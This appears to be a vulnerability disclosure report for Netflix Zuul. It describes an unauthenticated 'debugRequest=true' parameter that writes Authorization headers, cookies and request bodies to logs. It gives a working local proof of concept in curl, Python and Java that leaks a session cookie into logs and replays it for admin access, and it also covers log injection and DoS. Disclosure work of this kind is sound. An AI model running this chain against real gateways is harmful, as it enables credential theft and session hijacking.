# Impacted Asset: Open Source - Zuul https://github.com/Netflix/zuul

## Summary

An unauthenticated request debug feature in Zuul allows any client to enable per-request debug logging using the `debugRequest=true` query parameter. When enabled, Zuul captures and writes the full request line, all headers, and the request body to application logs.

This behavior results in multiple security issues:

* **Sensitive information disclosure** – credentials such as `Authorization` bearer tokens, cookies, session identifiers, and API keys are written to logs.
* **Denial of Service (resource exhaustion)** – the debug feature forces request body buffering and log output, allowing attackers to send large payloads to consume memory and disk.
* **Log forging / alert evasion** – attacker-controlled body content (including newlines) is logged verbatim, allowing injection of fake log entries.

The vulnerability exists because debug mode can be activated by any remote user without authentication or authorization.

In typical gateway deployments, Zuul forwards authentication material (cookies/bearer tokens). Logs are often exported to shared systems and accessible to broader roles than production traffic. This vulnerability allows an untrusted client to force those credentials into logs, enabling replay by any party with log access.

## Steps To Reproduce

### Environment Setup

1. Clone the Zuul repository and enter the project root

```bash
git clone https://github.com/Netflix/zuul
cd zuul
chmod +x ./gradlew
```

2. Start the sample Zuul application

```bash
./gradlew :zuul-sample:run
```

3. Verify the service is running

```bash
curl -sv http://localhost:7001/healthcheck
```

Expected response:

```
HTTP/1.1 200 OK
healthy
```

### Trigger Debug Logging (Information Disclosure)

1. Send a request enabling debug mode and include sensitive headers and body

```bash
curl -sv -X POST 'http://localhost:7001/healthcheck?debugRequest=true' \
  -H 'Authorization: Bearer SHOULD_NOT_BE_LOGGED' \
  -H 'Cookie: session=SHOULD_NOT_BE_LOGGED' \
  -H 'Content-Type: text/plain' \
  --data-binary $'line1\nline2'
```

2. Observe Zuul application logs in the running terminal


```bash
─(keshav㉿kali)-[~/Downloads/zuul]
└─$ curl -sv -X POST 'http://localhost:7001/healthcheck?debugRequest=true' \
  -H 'Authorization: Bearer SHOULD_NOT_BE_LOGGED' \
  -H 'Cookie: session=SHOULD_NOT_BE_LOGGED' \
  -H 'Content-Type: text/plain' \
  --data-binary $'line1\nline2'

Note: Unnecessary use of -X or --request, POST is already inferred.
* Host localhost:7001 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:7001...
* Established connection to localhost (::1 port 7001) from ::1 port 45180 
* using HTTP/1.x
> POST /healthcheck?debugRequest=true HTTP/1.1
> Host: localhost:7001
> User-Agent: curl/8.18.0
> Accept: */*
> Authorization: Bearer SHOULD_NOT_BE_LOGGED
> Cookie: session=SHOULD_NOT_BE_LOGGED
> Content-Type: text/plain
> Content-Length: 11
> 
* upload completely sent off: 11 bytes
< HTTP/1.1 200 OK
< Content-Length: 7
< X-Zuul-Status: SUCCESS
< X-Zuul-Proxy-Attempts: []
< X-Zuul: zuul
< X-Zuul-Instance: unknown
< X-Originating-URL: http://localhost:7001/healthcheck?debugRequest=true
< 
* Connection #0 to host localhost:7001 left intact
healthy                         

```


### Expected Result

User input should not be logged or debug functionality should require authorization.

### Actual Result

Zuul logs contain attacker-supplied sensitive data and body content:

```
REQ_DEBUG: POST /healthcheck?debugRequest=true HTTP/1.1
REQ_DEBUG: Authorization: Bearer SHOULD_NOT_BE_LOGGED
REQ_DEBUG: Cookie: session=SHOULD_NOT_BE_LOGGED
REQ_DEBUG: line1
REQ_DEBUG: line2
```

---

## Part B — Real-case Scenario PoC (Session Cookie Leakage → Replay → Admin Access)

This section demonstrates a realistic gateway scenario: Zuul proxies a "real" origin app with authentication and protected admin content. Debug mode causes the victim's session cookie to be logged, enabling replay.

### B1. Start the Origin "Real App" (Login + Admin)

**Terminal A:**

```bash
cat > /tmp/origin_demo.py <<'PY'
#!/usr/bin/env python3
import secrets, urllib.parse, json
from http.server import BaseHTTPRequestHandler, HTTPServer

SESSIONS = {}

def parse_cookie(h):
    out = {}
    if not h:
        return out
    for part in h.split(";"):
        if "=" in part:
            k, v = part.split("=", 1)
            out[k.strip()] = v.strip()
    return out

class H(BaseHTTPRequestHandler):
    def _json(self, code, obj, extra=None):
        raw = (json.dumps(obj, indent=2) + "\n").encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        u = urllib.parse.urlsplit(self.path)
        qs = urllib.parse.parse_qs(u.query)

        if u.path == "/login":
            user = (qs.get("user") or ["alice"])[0]
            sid = secrets.token_urlsafe(18)
            SESSIONS[sid] = user
            self._json(200, {"msg": "logged in", "user": user},
                       {"Set-Cookie": f"session={sid}; Path=/; HttpOnly"})
            return

        if u.path == "/admin":
            sid = parse_cookie(self.headers.get("Cookie")).get("session")
            user = SESSIONS.get(sid)
            if not user:
                self._json(401, {"error": "unauthorized"})
                return
            self._json(200, {"msg": "admin data", "user": user, "secret": "FLAG{demo_admin_secret}"})
            return

        self._json(404, {"error": "not found"})

HTTPServer(("127.0.0.1", 9000), H).serve_forever()
PY

python3 /tmp/origin_demo.py
```

Origin runs at: `http://127.0.0.1:9000`

### B2. Build Zuul Sample + Custom ServerList JAR

**Terminal B (in Zuul repo root):**

```bash
unset JAVA_TOOL_OPTIONS
./gradlew :zuul-sample:installDist

mkdir -p /tmp/zuul-demo-src/com/acme/zuuldemo /tmp/zuul-demo-classes

cat > /tmp/zuul-demo-src/com/acme/zuuldemo/DemoOriginServerList.java <<'EOF'
package com.acme.zuuldemo;

import com.google.common.base.Strings;
import com.google.common.collect.Lists;
import com.netflix.appinfo.InstanceInfo;
import com.netflix.appinfo.InstanceInfo.InstanceStatus;
import com.netflix.loadbalancer.ConfigurationBasedServerList;
import com.netflix.loadbalancer.Server;
import com.netflix.niws.loadbalancer.DiscoveryEnabledServer;
import java.util.List;

public class DemoOriginServerList extends ConfigurationBasedServerList {
  @Override
  protected List<Server> derive(String value) {
    List<Server> list = Lists.newArrayList();
    if (!Strings.isNullOrEmpty(value)) {
      for (String s : value.split(",", -1)) {
        String[] hp = s.split(":", -1);
        String host = hp[0];
        int port = Integer.parseInt(hp[1]);
        list.add(make(host, port));
      }
    }
    return list;
  }

  private static DiscoveryEnabledServer make(String host, int port) {
    InstanceInfo ii = InstanceInfo.Builder.newBuilder()
        .setAppName("api")
        .setHostName(host)
        .setIPAddr(host)
        .setPort(port)
        .setStatus(InstanceStatus.UP)
        .build();
    return new DiscoveryEnabledServer(ii, false, false);
  }
}
EOF

CP="zuul-sample/build/install/zuul-sample/lib/*"
javac -cp "$CP" -d /tmp/zuul-demo-classes /tmp/zuul-demo-src/com/acme/zuuldemo/DemoOriginServerList.java
jar cf /tmp/zuul-demo-serverlist.jar -C /tmp/zuul-demo-classes .

jar tf /tmp/zuul-demo-serverlist.jar | rg 'DemoOriginServerList'
```

### B3. Start Zuul with Explicit Classpath (Ensures Custom JAR is Loaded)

**Terminal B:**

```bash
unset JAVA_TOOL_OPTIONS

java \
  -Deureka.shouldFetchRegistry=false \
  -Deureka.registration.enabled=false \
  -Dapi.ribbon.NIWSServerListClassName=com.acme.zuuldemo.DemoOriginServerList \
  -Dapi.ribbon.listOfServers=127.0.0.1:9000 \
  -cp "/tmp/zuul-demo-serverlist.jar:zuul-sample/build/install/zuul-sample/lib/*" \
  com.netflix.zuul.sample.Bootstrap
```

Zuul listens at: `http://localhost:7001`

### B4. Sanity Check That Login is Proxied Through Zuul

**Terminal C:**

```bash
curl -si 'http://localhost:7001/login?user=victim'
```

**Expected:** `200 OK` and `Set-Cookie: session=...` (from the origin app, proxied through Zuul)

**Example (observed):**

```
Set-Cookie: session=PeTXlSwr_q1-qpCXY7qu3JcF; Path=/; HttpOnly
```

Full terminal output:

```bash
┌──(keshav㉿kali)-[~/Downloads/zuul]
└─$ curl -si 'http://localhost:7001/login?user=victim'

HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.13.11
Date: Sat, 14 Feb 2026 03:41:24 GMT
Content-Type: application/json
Content-Length: 45
Set-Cookie: session=PeTXlSwr_q1-qpCXY7qu3JcF; Path=/; HttpOnly
X-Zuul-Status: SUCCESS
X-Zuul-Proxy-Attempts: [{"status":200,"duration":23,"attempt":1,"instanceId":"127.0.0.1","ipAddress":"127.0.0.1","port":9000}]
X-Zuul: zuul
X-Zuul-Instance: unknown
X-Originating-URL: http://localhost:7001/login?user=victim

{
  "msg": "logged in",
  "user": "victim"
}

```

### B5. Exploit Chain: Victim Cookie Leaks to Logs via Unauth Debug Toggle

**Terminal C:**

```bash
rm -f /tmp/cj.txt

# Victim logs in (cookie jar stores HttpOnly session cookie)
curl -si -c /tmp/cj.txt 'http://localhost:7001/login?user=victim' >/dev/null

# Victim can access protected admin endpoint
curl -sS -b /tmp/cj.txt 'http://localhost:7001/admin'

# Victim is induced to hit a URL containing debugRequest=true
# (debug mode requires no auth, and logs headers including Cookie)
curl -si -b /tmp/cj.txt 'http://localhost:7001/admin?debugRequest=true' >/dev/null
```

**Observe Zuul logs (Terminal B)**
My terminal output
```bash
┌──(keshav㉿kali)-[~/Downloads/zuul]
└─$ rm -f /tmp/cj.txt

# Victim logs in (cookie jar now holds HttpOnly session)
curl -si -c /tmp/cj.txt 'http://localhost:7001/login?user=victim' >/dev/null

# Victim is authorized
curl -sS -b /tmp/cj.txt 'http://localhost:7001/admin'

# Attacker trick: victim hits a URL with debugRequest=true (no auth needed to enable debug)
curl -si -b /tmp/cj.txt 'http://localhost:7001/admin?debugRequest=true' >/dev/null

{
  "msg": "admin data",
  "user": "victim",
  "secret": "FLAG{demo_admin_secret}"
}

```


Look for `REQ_DEBUG:` output containing a cookie header:

```
REQ_DEBUG: ... /admin?debugRequest=true ...
REQ_DEBUG: Cookie: session=PeTXlSwr_q1-qpCXY7qu3JcF
```

This demonstrates that a victim's authenticated session cookie is written to logs.

### B6. Session Replay Using the Leaked Cookie Value

**Terminal C:**

```bash
curl -sS -H 'Cookie: session=PeTXlSwr_q1-qpCXY7qu3JcF' 'http://localhost:7001/admin'
```

**Expected / Observed:**

```json
{
  "msg": "admin data",
  "user": "victim",
  "secret": "FLAG{demo_admin_secret}"
}
```

This confirms a practical impact chain:

```
unauth debug toggle → credential logged → credential replay → unauthorized admin access
```

(for any party with log access)

### Expected Result

- Debug should not be enabled by arbitrary clients.
- Sensitive headers should be redacted.
- Request bodies should not be logged by default.
- Logging should be single-line safe (escape newlines) and size-capped.

### Actual Result

- Any client can enable debug with `debugRequest=true`.
- Zuul logs include sensitive headers (`Cookie`, `Authorization`) and request bodies.
- Newlines in body create multi-line log entries (log injection).
- In realistic proxy deployments, logged sessions/tokens can be replayed to access protected resources.

## Supporting Material/References

### Code Locations

* `Debug.java` – enables debug via query parameter
* `DebugRequest.java` – buffers headers and body
* `ZuulResponseFilter.java` – logs captured data

### Security Impact Demonstrated

* Credential leakage (Authorization & Cookie logged)
* Log injection (newline in body produces multiple log lines)
* Potential DoS via large request bodies
* Session hijacking via cookie replay

### Local Reproduction Logs

* Successful `/healthcheck` request returned `200 OK`
* Debug request produced `REQ_DEBUG:` log entries containing secrets
* `curl -si http://localhost:7001/login?user=victim` shows `Set-Cookie: session=...`
* `REQ_DEBUG:` log lines show `Cookie: session=...` recorded and printed
* Replay request with stolen cookie returns protected admin content

## Severity Assessment

This vulnerability represents a **critical security risk** due to:

1. **No authentication required** – any anonymous client can activate debug mode
2. **Credential exposure** – sensitive authentication tokens are logged in plaintext
3. **Multiple attack vectors** – information disclosure, DoS, and log injection
4. **Production impact** – if deployed with debug feature enabled, production credentials could be compromised
5. **Session hijacking** – demonstrated complete attack chain from credential leak to unauthorized admin access

## Recommendations

1. **Immediate**: Disable the debug query parameter feature in production environments
2. **Short-term**: Implement authentication/authorization checks before enabling debug mode
3. **Long-term**: 
   - Remove sensitive headers from debug output (implement allowlist/blocklist)
   - Sanitize logged content to prevent log injection
   - Implement rate limiting and size restrictions for debug requests
   - Add configuration options to completely disable debug features in production
